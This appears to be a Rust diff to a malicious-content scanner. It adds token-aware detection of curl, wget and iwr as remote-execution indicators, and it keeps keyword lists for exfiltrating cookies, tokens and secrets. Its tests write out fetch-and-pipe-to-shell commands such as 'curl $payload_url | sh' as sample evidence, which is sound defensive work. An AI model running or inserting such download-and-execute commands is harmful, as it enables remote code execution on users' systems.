@@ -6,17 +6,15 @@ use super::{
 
 const DEFAULT_FINDING_CONFIDENCE: f32 = 0.9;
 
-const REMOTE_EXEC_INDICATORS: &[&str] = &[
+const REMOTE_EXEC_LITERAL_INDICATORS: &[&str] = &[
     "http://",
     "https://",
-    "curl ",
-    "wget ",
     "fetch(",
     "requests.get",
     "urllib.request.urlopen",
     "invoke-webrequest",
-    "iwr ",
 ];
+const REMOTE_EXEC_COMMAND_INDICATORS: &[&str] = &["curl", "wget", "iwr"];
 const SENSITIVE_PAYLOAD_KEYWORDS: &[&str] = &["cookie", "token", "secret", "session"];
 const TRANSMIT_VERBS: &[&str] = &["send", "post", "upload", "forward", "exfiltrate"];
 const EXFIL_CHANNELS: &[&str] = &[
@@ -34,6 +32,34 @@ fn signal_weight(signal_class: SignalClass) -> f32 {
         SignalClass::MaliciousBehavior => super::SIGNAL_WEIGHT_MALICIOUS,
         SignalClass::ReviewSignal => super::SIGNAL_WEIGHT_REVIEW,
     }
+}
+
+fn value_contains_command_token(value: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = value[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let left_ok = value[..abs_pos].chars().next_back().is_none_or(|ch| {
+            ch.is_ascii_whitespace() || matches!(ch, '|' | ';' | '&' | '/' | '\\' | '(')
+        });
+        let right_ok = value[token_end..].chars().next().is_none_or(|ch| {
+            ch.is_ascii_whitespace() || matches!(ch, '|' | ';' | '&' | '>' | '<' | '(' | ')')
+        });
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
+}
+
+fn has_remote_exec_indicator(value: &str) -> bool {
+    REMOTE_EXEC_LITERAL_INDICATORS
+        .iter()
+        .any(|indicator| value.contains(indicator))
+        || REMOTE_EXEC_COMMAND_INDICATORS
+            .iter()
+            .any(|command| value_contains_command_token(value, command))
 }
 
 /// Builder for creating Finding instances
@@ -315,7 +341,7 @@ impl Finding {
     }
 
     fn evidence_matches_category(&self, value: &str) -> bool {
-        let has_remote_indicator = REMOTE_EXEC_INDICATORS.iter().any(|s| value.contains(s));
+        let has_remote_indicator = has_remote_exec_indicator(value);
         let has_sensitive_payload = SENSITIVE_PAYLOAD_KEYWORDS.iter().any(|s| value.contains(s));
         let has_transmit_verb = TRANSMIT_VERBS.iter().any(|s| value.contains(s));
         let has_exfil_channel = EXFIL_CHANNELS.iter().any(|s| value.contains(s));
@@ -343,6 +369,61 @@ impl Finding {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn supporting_remote_exec_finding(match_value: &str) -> Finding {
+        Finding::builder("TEST_REMOTE_EXEC", ThreatCategory::RemoteExec)
+            .severity(Severity::Critical)
+            .action(RecommendedAction::Block)
+            .evidence_kind(EvidenceKind::Behavior)
+            .matched_on(MatchTarget::ReferencedFile {
+                path: "install.sh".to_string(),
+            })
+            .artifact(
+                ArtifactKind::ReferencedArtifact,
+                Some("install.sh".to_string()),
+            )
+            .signal_class(SignalClass::MaliciousBehavior)
+            .match_value(match_value)
+            .reason("remote execution")
+            .build()
+    }
+
+    /// # Contract
+    ///
+    /// Conclusive remote-exec evidence accepts shell command separators that
+    /// are valid outside the detector layer.
+    #[test]
+    fn conclusive_remote_exec_evidence_accepts_tab_separated_command_indicators() {
+        for match_value in [
+            "curl\t$payload_url | sh",
+            "wget\t$payload_url -O- | sh",
+            "iwr\t$payload_url | iex",
+        ] {
+            let finding = supporting_remote_exec_finding(match_value);
+            assert!(
+                finding.is_conclusive_malicious_evidence(),
+                "{match_value:?} must remain conclusive remote-exec evidence",
+            );
+        }
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Remote-exec evidence command indicators are token-aware.
+    #[test]
+    fn conclusive_remote_exec_evidence_rejects_command_indicator_substrings() {
+        for match_value in [
+            "mycurl\t$payload_url | sh",
+            "prewget\t$payload_url -O- | sh",
+            "kiwr\t$payload_url | iex",
+        ] {
+            let finding = supporting_remote_exec_finding(match_value);
+            assert!(
+                !finding.is_conclusive_malicious_evidence(),
+                "{match_value:?} must not be conclusive remote-exec evidence",
+            );
+        }
+    }
 
     /// Contract: a NaN `confidence(...)` call is silently ignored — the
     /// builder preserves whatever value was set previously (default
